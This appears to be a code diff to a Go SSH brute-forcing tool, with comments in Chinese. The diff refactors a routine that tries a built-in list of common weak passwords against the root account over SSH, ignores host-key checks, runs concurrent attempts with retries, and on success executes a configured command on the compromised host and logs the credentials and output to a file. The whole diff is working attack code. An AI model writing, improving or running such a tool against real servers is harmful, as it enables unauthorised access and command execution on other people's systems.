@@ -3,12 +3,16 @@ package brute
 import (
 	"fmt"
 	"golang.org/x/crypto/ssh"
+	"net"
 	"os"
+	"strings"
+	"time"
 )
 import "bruteforcer/Global"
 
-var sshBruteUsers = []string{"root", "ubuntu"}
-var sshBrutePwds = []string{"123456",
+var sshBruteUsers = []string{"root"}
+var sshBrutePwds = []string{
+	"123456",
 	"123456789",
 	"12345678",
 	"654321",
@@ -58,64 +62,86 @@ var sshBrutePwds = []string{"123456",
 	"1q2w3e"}
 
 func SSHBrute(host string, port string, file *os.File) {
+	if Global.USR != "" {
+		sshBruteUsers = append(sshBruteUsers, Global.USR)
+	}
+	if Global.PWD != "" {
+		sshBrutePwds = append(sshBrutePwds, Global.PWD)
+	}
 	isSuc := false
 	if Global.DBG {
 		fmt.Printf("%v开始执行\n", host+":"+port)
 	}
 	for _, user := range sshBruteUsers {
 		for _, pwd := range sshBrutePwds {
-			if !isSuc {
-				go func() {
-					user_ := user
-					pwd_ := pwd
-					sshConf := &ssh.ClientConfig{
-						User: user_,
-						Auth: []ssh.AuthMethod{
-							ssh.Password(pwd_),
-						},
-						HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-					}
-					sshdial, err := ssh.Dial("tcp", host+":"+port, sshConf)
-					if err == nil { //如果密码正确
+			go doSingleSSHBrute(host, port, user, pwd, &isSuc, file)
+			time.Sleep(time.Duration(300 * time.Microsecond))
 
-						defer func(sshdial *ssh.Client) { // 关闭ssh通道
-							err := sshdial.Close()
-							if err != nil {
-							}
-						}(sshdial)
-						//密码正确
-						session, sessionerr := sshdial.NewSession()
-						if sessionerr == nil {
-							defer func(session *ssh.Session) { // 关闭session
-								err := session.Close()
-								if err != nil {
-								}
-							}(session)
+		}
+	}
+}
+func doSingleSSHBrute(host string, port string, user string, pwd string, isSuc *bool, file *os.File) {
+	retryN := 0
+restart:
+	retryN++
+	sshConf := &ssh.ClientConfig{
+		User: user,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(pwd),
+		},
+		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
+			return nil
+		},
+	}
+	sshdial, err := ssh.Dial("tcp", host+":"+port, sshConf)
+	if err == nil { //如果密码正确
 
-							shellOutput, runerr := session.CombinedOutput(Global.CMD)
-							if runerr == nil {
-								if isSuc {
-									return
-								}
-
-								sucOutStr := fmt.Sprintf("%v:%v-%v:%v=%v->%v", host, port, user_, pwd_, Global.CMD, string(shellOutput))
-								println(sucOutStr)                        // 输出成功信息
-								_, _ = file.WriteString(sucOutStr + "\n") // 打印信息
-								isSuc = true
-							}
-						}
-
-					} else {
-						if Global.DBG {
-							OutStr := fmt.Sprintf("%v:%v-%v:%v", host, port, user_, pwd_)
-							println("err" + OutStr)
-							println(err.Error())
-							return
-						}
-					}
-				}()
+		defer func(sshdial *ssh.Client) { // 关闭ssh通道
+			err := sshdial.Close()
+			if err != nil && Global.DBG {
+				println("ssh通道关闭错误")
 			}
+		}(sshdial)
+		//密码正确
+		session, sessionerr := sshdial.NewSession()
+		if sessionerr == nil {
+			defer func(session *ssh.Session) { // 关闭session
+				err := session.Close()
+				if err != nil && Global.DBG {
+					println("session关闭错误")
+				}
+			}(session)
 
+			shellOutput, runerr := session.CombinedOutput(Global.CMD)
+			if runerr == nil {
+				if *isSuc {
+					return
+				}
+				if Global.DBG {
+					println("成功")
+				}
+				sucOutStr := fmt.Sprintf("%v:%v-%v:%v=%v->%v", host, port, user, pwd, Global.CMD, string(shellOutput))
+				println(sucOutStr)                        // 输出成功信息
+				_, _ = file.WriteString(sucOutStr + "\n") // 打印信息
+				*isSuc = true
+			} else if Global.DBG {
+				println(fmt.Sprintf("命令运行错误 %v", runerr))
+			}
+		} else {
+			if Global.DBG {
+				println("session创建错误")
+			}
+		}
+
+	} else {
+		if (strings.Contains(err.Error(), "handshake failed") || strings.Contains(err.Error(), "forcibly closed")) && retryN <= 3 {
+			goto restart // 如果不是验证错误的重试3次
+		}
+		if Global.DBG {
+			OutStr := fmt.Sprintf("%v:%v-%v:%v", host, port, user, pwd)
+			println("err" + OutStr)
+			println(err.Error())
+			//return
 		}
 	}
 }
